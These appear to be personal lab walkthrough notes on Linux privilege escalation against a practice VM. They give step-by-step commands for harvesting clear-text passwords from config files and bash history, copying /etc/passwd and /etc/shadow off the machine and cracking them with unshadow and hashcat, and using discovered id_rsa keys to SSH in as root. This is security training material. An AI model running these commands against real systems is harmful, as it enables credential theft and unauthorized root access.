#Linux #PrivEsc #ConfigFiles #Find #bash #history #/etc/passwd #/etc/shadow #ssh 

[Looting for Passwords](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#looting-for-passwords)

# **Stored Passwords (Config Files)**
#ConfigFiles #Find
## **Exploitation**
Linux VM

1. In command prompt type: `cat /home/user/myvpn.ovpn`
2. From the output, make note of the value of the “auth-user-pass” directive.
3. In command prompt type: `cat /etc/openvpn/auth.txt`
4. From the output, make note of the clear-text credentials.
5. In command prompt type: `cat /home/user/.irssi/config | grep -i passw`
6. From the output, make note of the clear-text credentials.

- `history`
	- `ls -la`
		- `cat .bash_history`
- `find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;`

---
# Stored Passwords (History)
#bash #history 

## **Exploitation**
Linux VM

1. In command prompt type: `cat ~/.bash_history | grep -i passw`
2. From the output, make note of the clear-text credentials.

---

# **Weak File Permissions**
#/etc/passwd #/etc/shadow 

## **Detection**
Linux VM

1. In command prompt type: `ls -la /etc/shadow`
2. Note the file permissions

## **Exploitation**
Linux VM

1. In command prompt type: **cat /etc/passwd**
2. Save the output to a file on your attacker machine
3. In command prompt type: **cat /etc/shadow**
4. Save the output to a file on your attacker machine

Attacker VM  

1. In command prompt type:
`unshadow <PASSWORD-FILE> <SHADOW-FILE> > unshadowed.txt`

Now, you have an unshadowed file.  We already know the password, but you can use your favorite hash cracking tool to crack dem hashes.  For example:

`hashcat -m 1800 unshadowed.txt rockyou.txt -O`

---

# **SSH Keys**
#Find #ssh 

## **Detection**
Linux VM

1. In command prompt type: `find / -name authorized_keys 2> /dev/null`
2. In a command prompt type: `find / -name id_rsa 2> /dev/null`  
3. Note the results.

## **Exploitation**
Linux VM

1. Copy the contents of the discovered `id_rsa `file to a file on your attacker VM.


Attacker VM  

1. In command prompt type: `chmod 400 id_rsa`
2. In command prompt type: `ssh -i id_rsa root@<ip>`

You should now have a root shell :)